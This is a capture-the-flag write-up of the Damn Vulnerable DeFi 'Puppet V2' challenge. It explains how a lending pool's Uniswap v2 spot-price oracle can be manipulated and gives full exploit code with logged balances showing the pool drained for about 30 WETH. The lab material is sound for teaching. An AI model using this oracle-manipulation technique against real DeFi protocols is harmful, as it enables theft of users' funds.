## 1) Challenge

> <cite>The developers of the [last lending pool](https://www.damnvulnerabledefi.xyz/challenges/8.html) are saying that they've learned the lesson. And just released a new version!</cite>
> <cite>Now they're using a [Uniswap v2 exchange](https://docs.uniswap.org/protocol/V2/introduction) as a price oracle, along with the recommended utility libraries. That should be enough.</cite>
> <cite>You start with 20 ETH and 10000 DVT tokens in balance. The new lending pool has a million DVT tokens in balance. You know what to do ;). </cite>([link](https://www.damnvulnerabledefi.xyz/challenges/9.html))

Challenge created by [@tinchoabbate](https://twitter.com/tinchoabbate).


## 2) Code Review
For this challenge, we have only one contract: `PuppetV2Pool` ([source code](https://github.com/tinchoabbate/damn-vulnerable-defi/blob/v2.2.0/contracts/puppet-v2/PuppetV2Pool.sol)):
```solidity

contract PuppetV2Pool {
    using SafeMath for uint256;

    address private _uniswapPair;
    address private _uniswapFactory;
    IERC20 private _token;
    IERC20 private _weth;
    
    mapping(address => uint256) public deposits;
        
    event Borrowed(address indexed borrower, uint256 depositRequired, uint256 borrowAmount, uint256 timestamp);

    constructor (
        address wethAddress,
        address tokenAddress,
        address uniswapPairAddress,
        address uniswapFactoryAddress
    ) public {
        _weth = IERC20(wethAddress);
        _token = IERC20(tokenAddress);
        _uniswapPair = uniswapPairAddress;
        _uniswapFactory = uniswapFactoryAddress;
    }

    /**
     * @notice Allows borrowing `borrowAmount` of tokens by first depositing three times their value in WETH
     *         Sender must have approved enough WETH in advance.
     *         Calculations assume that WETH and borrowed token have same amount of decimals.
     */
    function borrow(uint256 borrowAmount) external {
        require(_token.balanceOf(address(this)) >= borrowAmount, "Not enough token balance");

        // Calculate how much WETH the user must deposit
        uint256 depositOfWETHRequired = calculateDepositOfWETHRequired(borrowAmount);
        
        // Take the WETH
        _weth.transferFrom(msg.sender, address(this), depositOfWETHRequired);

        // internal accounting
        deposits[msg.sender] += depositOfWETHRequired;

        require(_token.transfer(msg.sender, borrowAmount));

        emit Borrowed(msg.sender, depositOfWETHRequired, borrowAmount, block.timestamp);
    }

    function calculateDepositOfWETHRequired(uint256 tokenAmount) public view returns (uint256) {
        return _getOracleQuote(tokenAmount).mul(3) / (10 ** 18);
    }

    // Fetch the price from Uniswap v2 using the official libraries
    function _getOracleQuote(uint256 amount) private view returns (uint256) {
        (uint256 reservesWETH, uint256 reservesToken) = UniswapV2Library.getReserves(
            _uniswapFactory, address(_weth), address(_token)
        );
        return UniswapV2Library.quote(amount.mul(10 ** 18), reservesToken, reservesWETH);
    }
}

```
- `borrow` accepts the amount to borrow and:
    - checks if the pool has enough tokens to borrow (line `47`)
    - computes the `WETH` deposit required to borrow the token amount requested. It calls the `calculateDepositOfWETHRequired` function (line `50`)
    - transfers the `WETH` tokens required to the `weth` token contract (line `53`)
    - updates the `deposits` variable for the `msg.sender` (line `56`)
    - tranfers the tokens to `msg.sender` (line `58`)
- `calculateDepositOfWETHRequired` returns the deposit required as collateral. It calls `_getOracleQuote` to retrieve the price used in the formula `_getOracleQuote() * 3 / 10 ** 18`
- `_getOracleQuote` computes the token's price by using information from the Uniswap pair (line `69`). In particular, the price is calculated by using the `quote` function from the Uniswap library, which is defined as follows ([source code](https://github.com/Uniswap/v2-periphery/blob/master/contracts/libraries/UniswapV2Library.sol#L36-L40)):
```solidity

// given some amount of an asset and pair reserves, returns an equivalent amount of the other asset
function quote(uint amountA, uint reserveA, uint reserveB) internal pure returns (uint amountB) {
    require(amountA > 0, 'UniswapV2Library: INSUFFICIENT_AMOUNT');
    require(reserveA > 0 && reserveB > 0, 'UniswapV2Library: INSUFFICIENT_LIQUIDITY');
    amountB = amountA.mul(reserveB) / reserveA;
}

```

#### How is the DVT price computed?

The formulas involved are:

```

price = _getOracleQuote(tokenAmount) * 3 / (10 ** 18);
_getOracleQuote(tokenAmount) = [amount * (10 ** 18)] * reservesWETH / reservesToken

=> price = ([amount * (10 ** 18)] * reservesWETH / reservesToken) * 3 / (10 ** 18)
=> price = (amount * reservesWETH / reservesToken) * 3

```

The price is indirectly proportional to the amount of `reservesToken`: if we increase the amount of `reservesToken`, the denominator in the formula will be higher, and thus the resulting value will be smaller.


Here are the current balances:
- we have `20 ETH` ([setup](https://github.com/tinchoabbate/damn-vulnerable-defi/blob/master/test/puppet-v2/puppet-v2.challenge.js#L22-L25)) and `10000 DVT` ([setup](https://github.com/tinchoabbate/damn-vulnerable-defi/blob/master/test/puppet-v2/puppet-v2.challenge.js#L15))
- the Uniswap exchange has `10 WETH` and `100 DVT` ([setup](https://github.com/tinchoabbate/damn-vulnerable-defi/blob/master/test/puppet-v2/puppet-v2.challenge.js#L12-L13))
- the pool has `1000000 DVT` ([setup](https://github.com/tinchoabbate/damn-vulnerable-defi/blob/master/test/puppet-v2/puppet-v2.challenge.js#L16))


The initial `WETH` deposit required to borrow `1000000 DVT` is ` 300000 WETH`:

```
price = (amount * reservesWETH / reservesToken) * 3
price = (1000000 * 10 / 100) * 3 = 300000
```


## 3) Solution

To reduce the `DVT` price, I used the following approach:
1) sell all the `DVT` for `WETH` (this increases the `DVT` amount) by calling `swapExactTokensForTokens`
2) sell all our `ETH` for `DVT` by calling `swapExactETHForTokens`
3) sell the `DVT` for `WETH` by calling `swapExactTokensForTokens` (this increases the `DVT` amount)
4) borrow the `1000000 DVT` (that will cost `~29.6 WETH`)

`puppet-v2.challenge.js`:
```javascript

    it('Exploit', async function () {
        /** CODE YOUR EXPLOIT HERE */

        let provider = ethers.provider
        const deadline = (await ethers.provider.getBlock('latest')).timestamp * 2

        function formatOutput(val){
            return parseFloat(ethers.utils.formatEther(val)).toFixed(3)
        }

        async function logData() {

            let row1 = {
                "pool DVT": formatOutput(await this.token.balanceOf(this.lendingPool.address)),
                "pool WETH": formatOutput(await this.weth.balanceOf(this.lendingPool.address)),
                "pool balance": formatOutput(await provider.getBalance(this.lendingPool.address)),
                "attacker DVT": formatOutput(await this.token.balanceOf(attacker.address)),
                "attacker WETH": formatOutput(await this.weth.balanceOf(attacker.address)),
                "attacker balance": formatOutput(await provider.getBalance(attacker.address)),
                "exchange DVT": formatOutput(await this.token.balanceOf(this.uniswapExchange.address)),
                "exchange WETH": formatOutput(await this.weth.balanceOf(this.uniswapExchange.address)),
                "exchange balance": formatOutput(await provider.getBalance(this.uniswapExchange.address))
            };

            let depositRequired = await this.lendingPool.calculateDepositOfWETHRequired(POOL_INITIAL_TOKEN_BALANCE)
            console.table([row1]);
            console.log(`[+] Deposit required to borrow ${ethers.utils.formatEther(POOL_INITIAL_TOKEN_BALANCE)} DVT: ${formatOutput(depositRequired)} WETH\n`)
        }
        
        console.log("0) Initial setup");
        await logData.call(this);


        console.log("1) swap all DVT for WETH");
        await this.token.connect(attacker).approve(this.uniswapRouter.address, ATTACKER_INITIAL_TOKEN_BALANCE)
        
        await this.uniswapRouter.connect(attacker).swapExactTokensForTokens(
            ATTACKER_INITIAL_TOKEN_BALANCE,
            0,
            [this.token.address, this.weth.address],
            attacker.address,
            deadline
        )
        await logData.call(this);


        console.log("2) swap all ETH for DVT");
        const ATTACKER_BALANCE = await provider.getBalance(attacker.address)
        await this.uniswapRouter.connect(attacker).swapExactETHForTokens(
            0,                                                          
            [this.weth.address, this.token.address],                   
            attacker.address,                                           
            deadline,   
            { value: ATTACKER_BALANCE.sub(ethers.utils.parseEther('0.1')) }
        )

        await logData.call(this);


        console.log("3) swap all DVT for WETH");
        const ATTACKER_TOKEN_BALANCE = await this.token.balanceOf(attacker.address)
        await this.token.connect(attacker).approve(this.uniswapRouter.address, ATTACKER_TOKEN_BALANCE)

        await this.uniswapRouter.connect(attacker).swapExactTokensForTokens(
            ATTACKER_TOKEN_BALANCE,
            0,
            [this.token.address, this.weth.address],
            attacker.address,
            deadline
        )

        await logData.call(this);


        console.log("4) borrow DVT");
        let depositRequired = await this.lendingPool.calculateDepositOfWETHRequired(POOL_INITIAL_TOKEN_BALANCE)

        await this.weth.connect(attacker).approve(this.lendingPool.address, depositRequired)
        await this.lendingPool.connect(attacker).borrow(POOL_INITIAL_TOKEN_BALANCE)

        await logData.call(this);

    });

```

I added some log information to keep track of the different balances. The following is the output obtained from running the above code:

```

0) Initial setup
┌─────────┬───────────────┬───────────┬──────────────┬──────────────┬───────────────┬──────────────────┬──────────────┬───────────────┬──────────────────┐
│ (index) │   pool DVT    │ pool WETH │ pool balance │ attacker DVT │ attacker WETH │ attacker balance │ exchange DVT │ exchange WETH │ exchange balance │
├─────────┼───────────────┼───────────┼──────────────┼──────────────┼───────────────┼──────────────────┼──────────────┼───────────────┼──────────────────┤
│    0    │ '1000000.000' │  '0.000'  │   '0.000'    │ '10000.000'  │    '0.000'    │     '20.000'     │  '100.000'   │   '10.000'    │     '0.000'      │
└─────────┴───────────────┴───────────┴──────────────┴──────────────┴───────────────┴──────────────────┴──────────────┴───────────────┴──────────────────┘
[+] Deposit required to borrow 1000000.0 DVT: 300000.000 WETH

1) swap all DVT for WETH
┌─────────┬───────────────┬───────────┬──────────────┬──────────────┬───────────────┬──────────────────┬──────────────┬───────────────┬──────────────────┐
│ (index) │   pool DVT    │ pool WETH │ pool balance │ attacker DVT │ attacker WETH │ attacker balance │ exchange DVT │ exchange WETH │ exchange balance │
├─────────┼───────────────┼───────────┼──────────────┼──────────────┼───────────────┼──────────────────┼──────────────┼───────────────┼──────────────────┤
│    0    │ '1000000.000' │  '0.000'  │   '0.000'    │   '0.000'    │    '9.901'    │     '20.000'     │ '10100.000'  │    '0.099'    │     '0.000'      │
└─────────┴───────────────┴───────────┴──────────────┴──────────────┴───────────────┴──────────────────┴──────────────┴───────────────┴──────────────────┘
[+] Deposit required to borrow 1000000.0 DVT: 29.496 WETH

2) swap all ETH for DVT
┌─────────┬───────────────┬───────────┬──────────────┬──────────────┬───────────────┬──────────────────┬──────────────┬───────────────┬──────────────────┐
│ (index) │   pool DVT    │ pool WETH │ pool balance │ attacker DVT │ attacker WETH │ attacker balance │ exchange DVT │ exchange WETH │ exchange balance │
├─────────┼───────────────┼───────────┼──────────────┼──────────────┼───────────────┼──────────────────┼──────────────┼───────────────┼──────────────────┤
│    0    │ '1000000.000' │  '0.000'  │   '0.000'    │ '10049.699'  │    '9.901'    │     '0.100'      │   '50.301'   │   '19.999'    │     '0.000'      │
└─────────┴───────────────┴───────────┴──────────────┴──────────────┴───────────────┴──────────────────┴──────────────┴───────────────┴──────────────────┘
[+] Deposit required to borrow 1000000.0 DVT: 1192751.934 WETH

3) swap all DVT for WETH
┌─────────┬───────────────┬───────────┬──────────────┬──────────────┬───────────────┬──────────────────┬──────────────┬───────────────┬──────────────────┐
│ (index) │   pool DVT    │ pool WETH │ pool balance │ attacker DVT │ attacker WETH │ attacker balance │ exchange DVT │ exchange WETH │ exchange balance │
├─────────┼───────────────┼───────────┼──────────────┼──────────────┼───────────────┼──────────────────┼──────────────┼───────────────┼──────────────────┤
│    0    │ '1000000.000' │  '0.000'  │   '0.000'    │   '0.000'    │   '29.800'    │     '0.100'      │ '10100.000'  │    '0.100'    │     '0.000'      │
└─────────┴───────────────┴───────────┴──────────────┴──────────────┴───────────────┴──────────────────┴──────────────┴───────────────┴──────────────────┘
[+] Deposit required to borrow 1000000.0 DVT: 29.673 WETH

4) borrow DVT
┌─────────┬──────────┬───────────┬──────────────┬───────────────┬───────────────┬──────────────────┬──────────────┬───────────────┬──────────────────┐
│ (index) │ pool DVT │ pool WETH │ pool balance │ attacker DVT  │ attacker WETH │ attacker balance │ exchange DVT │ exchange WETH │ exchange balance │
├─────────┼──────────┼───────────┼──────────────┼───────────────┼───────────────┼──────────────────┼──────────────┼───────────────┼──────────────────┤
│    0    │ '0.000'  │ '29.673'  │   '0.000'    │ '1000000.000' │    '0.126'    │     '0.099'      │ '10100.000'  │    '0.100'    │     '0.000'      │
└─────────┴──────────┴───────────┴──────────────┴───────────────┴───────────────┴──────────────────┴──────────────┴───────────────┴──────────────────┘
[+] Deposit required to borrow 1000000.0 DVT: 29.673 WETH

```


You can find the complete code [here](https://github.com/dellalibera/damn-vulnerable-defi-solutions/blob/master/test/puppet-v2/puppet-v2.challenge.js).


## 4) References

- [The Uniswap V2 Protocol](https://docs.uniswap.org/protocol/V2/introduction)